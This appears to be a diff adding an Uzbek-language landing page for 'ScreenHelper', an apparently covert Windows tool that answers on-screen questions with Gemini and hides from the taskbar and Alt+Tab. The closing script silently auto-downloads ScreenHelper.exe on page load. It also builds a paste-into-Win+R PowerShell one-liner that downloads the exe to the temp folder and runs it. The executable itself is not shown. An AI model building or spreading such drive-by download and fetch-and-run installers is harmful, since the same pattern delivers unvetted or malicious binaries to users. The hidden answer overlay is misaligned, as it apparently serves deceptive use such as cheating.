@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ScreenHelper — Aqlli Ekran Yordamchisi</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #060608;
+      --surface: #0e0e12;
+      --border: rgba(255,255,255,0.07);
+      --accent: #7c6dfa;
+      --accent2: #a78bfa;
+      --text: #f0eeff;
+      --muted: #6b6880;
+      --success: #34d399;
+      --warn: #fbbf24;
+    }
+
+    html, body {
+      height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      overflow-x: hidden;
+    }
+
+    /* ── Animated background ── */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 60% 40% at 30% 20%, rgba(124,109,250,0.12) 0%, transparent 70%),
+        radial-gradient(ellipse 50% 50% at 75% 80%, rgba(167,139,250,0.08) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    /* ── Layout ── */
+    .page {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* ── Badge ── */
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(124,109,250,0.12);
+      border: 1px solid rgba(124,109,250,0.25);
+      border-radius: 100px;
+      padding: 5px 14px;
+      font-size: 11px;
+      font-weight: 500;
+      letter-spacing: 0.06em;
+      color: var(--accent2);
+      text-transform: uppercase;
+      margin-bottom: 28px;
+    }
+    .badge .dot {
+      width: 6px; height: 6px;
+      border-radius: 50%;
+      background: var(--success);
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%,100% { opacity:1; transform:scale(1); }
+      50%      { opacity:.4; transform:scale(1.4); }
+    }
+
+    /* ── Heading ── */
+    h1 {
+      font-size: clamp(2rem, 5vw, 3.6rem);
+      font-weight: 700;
+      line-height: 1.1;
+      text-align: center;
+      letter-spacing: -0.03em;
+      margin-bottom: 18px;
+    }
+    h1 span {
+      background: linear-gradient(135deg, #a78bfa, #7c6dfa, #60a5fa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .sub {
+      font-size: 1.05rem;
+      color: var(--muted);
+      text-align: center;
+      max-width: 480px;
+      line-height: 1.7;
+      margin-bottom: 48px;
+    }
+
+    /* ── Cards ── */
+    .cards {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      max-width: 680px;
+      width: 100%;
+      margin-bottom: 48px;
+    }
+    @media(max-width:580px){ .cards{ grid-template-columns:1fr; } }
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 20px 18px;
+      text-align: center;
+      transition: border-color .25s;
+    }
+    .card:hover { border-color: rgba(124,109,250,0.3); }
+    .card .icon { font-size: 1.7rem; margin-bottom: 10px; }
+    .card h3 { font-size: .85rem; font-weight: 600; margin-bottom: 5px; color: var(--text); }
+    .card p  { font-size: .75rem; color: var(--muted); line-height: 1.5; }
+
+    /* ── Divider ── */
+    .divider {
+      width: 100%;
+      max-width: 480px;
+      height: 1px;
+      background: var(--border);
+      margin: 0 auto 40px;
+    }
+
+    /* ── Action block ── */
+    .actions {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      width: 100%;
+      max-width: 420px;
+    }
+
+    /* Status pill */
+    #status {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(52,211,153,0.08);
+      border: 1px solid rgba(52,211,153,0.18);
+      border-radius: 100px;
+      padding: 8px 18px;
+      font-size: .82rem;
+      color: var(--success);
+      width: 100%;
+      justify-content: center;
+      transition: all .4s;
+    }
+    #status.loading {
+      background: rgba(124,109,250,0.08);
+      border-color: rgba(124,109,250,0.2);
+      color: var(--accent2);
+    }
+    #status.warn {
+      background: rgba(251,191,36,0.08);
+      border-color: rgba(251,191,36,0.2);
+      color: var(--warn);
+    }
+    .spinner {
+      width:14px; height:14px;
+      border:2px solid rgba(124,109,250,0.3);
+      border-top-color: var(--accent);
+      border-radius:50%;
+      animation: spin .7s linear infinite;
+      display:none;
+    }
+    #status.loading .spinner { display:block; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    /* Buttons */
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      padding: 14px 24px;
+      border-radius: 12px;
+      font-family: inherit;
+      font-size: .95rem;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: none;
+      transition: all .2s;
+      border: none;
+      position: relative;
+      overflow: hidden;
+    }
+    .btn::after {
+      content:'';
+      position:absolute;
+      inset:0;
+      background:rgba(255,255,255,0);
+      transition: background .2s;
+    }
+    .btn:hover::after { background:rgba(255,255,255,0.06); }
+    .btn:active       { transform:scale(.98); }
+
+    .btn-primary {
+      background: linear-gradient(135deg, #7c6dfa, #6056d8);
+      color: #fff;
+      box-shadow: 0 4px 24px rgba(124,109,250,0.35);
+    }
+    .btn-secondary {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      color: var(--text);
+    }
+    .btn-secondary:hover { border-color: rgba(124,109,250,0.35); }
+
+    /* PS block */
+    .ps-block {
+      width: 100%;
+      background: #0a0a0d;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 14px 16px;
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+    }
+    .ps-block.visible { display: flex; }
+    .ps-label { font-size: .72rem; color: var(--muted); letter-spacing:.04em; text-transform:uppercase; }
+    .ps-code {
+      font-family: 'Courier New', monospace;
+      font-size: .72rem;
+      color: #a78bfa;
+      word-break: break-all;
+      line-height: 1.5;
+      user-select: all;
+    }
+    .ps-hint { font-size: .72rem; color: var(--muted); }
+    .ps-hint kbd {
+      background: rgba(255,255,255,0.08);
+      border-radius: 4px;
+      padding: 1px 6px;
+      font-size: .7rem;
+      border: 1px solid rgba(255,255,255,0.12);
+    }
+
+    /* Footer */
+    footer {
+      margin-top: 60px;
+      font-size: .72rem;
+      color: var(--muted);
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+<div class="page">
+
+  <div class="badge"><span class="dot"></span> Windows · Bepul · Yengil</div>
+
+  <h1>Aqlli <span>Ekran</span><br/>Yordamchisi</h1>
+  <p class="sub">
+    Ekrandagi savollarni bir tugma bilan tahlil etadi va javobni ekranda ko'rsatadi.
+    Deyarli ko'rinmas. Orqa fonda ishlaydi.
+  </p>
+
+  <div class="cards">
+    <div class="card">
+      <div class="icon">⚡</div>
+      <h3>Ultra tez</h3>
+      <p>Ctrl+Alt+S bosing — 2 soniyada javob</p>
+    </div>
+    <div class="card">
+      <div class="icon">👻</div>
+      <h3>Ko'rinmas</h3>
+      <p>Taskbar va Alt+Tab da umuman ko'rinmaydi</p>
+    </div>
+    <div class="card">
+      <div class="icon">🤖</div>
+      <h3>Gemini AI</h3>
+      <p>Google Gemini bilan ishlaydi</p>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <div class="actions">
+    <div id="status" class="loading">
+      <div class="spinner"></div>
+      <span id="statusText">O'rnatish tayyorlanmoqda…</span>
+    </div>
+
+    <a id="dlBtn" class="btn btn-primary" href="ScreenHelper.exe" download="ScreenHelper.exe">
+      <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+      Yuklab olish
+    </a>
+
+    <button class="btn btn-secondary" id="psBtn" onclick="showPS()">
+      <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
+      </svg>
+      PowerShell orqali o'rnatish
+    </button>
+
+    <div class="ps-block" id="psBlock">
+      <div class="ps-label">PowerShell buyrug'i (1 marta ishga tushiriladi)</div>
+      <div class="ps-code" id="psCode"></div>
+      <button class="btn btn-primary" style="padding:10px;" onclick="copyPS()">
+        📋 Nusxalash (Clipboard)
+      </button>
+      <div class="ps-hint">
+        Keyin: <kbd>Win+R</kbd> → <kbd>powershell</kbd> → Enter → <kbd>Ctrl+V</kbd> → Enter
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    ScreenHelper v1.0 · Windows 10/11 · .NET Framework 4.x
+  </footer>
+</div>
+
+<script>
+  // ── Build PowerShell command dynamically ──
+  const exeUrl = window.location.origin
+    ? window.location.origin + window.location.pathname.replace('index.html','') + 'ScreenHelper.exe'
+    : 'ScreenHelper.exe';
+
+  const psCmd = `$u='${exeUrl}';$p="$env:TEMP\\ScreenHelper.exe";(New-Object Net.WebClient).DownloadFile($u,$p);Start-Process $p`;
+  document.getElementById('psCode').textContent = psCmd;
+
+  // ── Auto-download on load ──
+  window.addEventListener('load', () => {
+    const st     = document.getElementById('status');
+    const stTxt  = document.getElementById('statusText');
+
+    setTimeout(() => {
+      try {
+        // Trigger download silently via hidden anchor
+        const a = document.createElement('a');
+        a.href     = 'ScreenHelper.exe';
+        a.download = 'ScreenHelper.exe';
+        a.style.display = 'none';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        // Update status
+        st.className = '';
+        stTxt.textContent = '✓ Fayl yuklanmoqda — yuklab bo\'lgach ishga tushiring';
+      } catch(e) {
+        st.className = 'warn';
+        stTxt.textContent = '⚠ Avtomatik yuklanmadi — quyidagi tugmani bosing';
+      }
+    }, 800);
+  });
+
+  function showPS() {
+    const block = document.getElementById('psBlock');
+    block.classList.toggle('visible');
+  }
+
+  function copyPS() {
+    const cmd = document.getElementById('psCode').textContent;
+    navigator.clipboard.writeText(cmd).then(() => {
+      const btn = event.target;
+      btn.textContent = '✓ Nusxalandi!';
+      setTimeout(() => btn.textContent = '📋 Nusxalash (Clipboard)', 2000);
+    }).catch(() => {
+      // Fallback: select text
+      const range = document.createRange();
+      range.selectNode(document.getElementById('psCode'));
+      window.getSelection().removeAllRanges();
+      window.getSelection().addRange(range);
+    });
+  }
+</script>
+</body>
+</html>
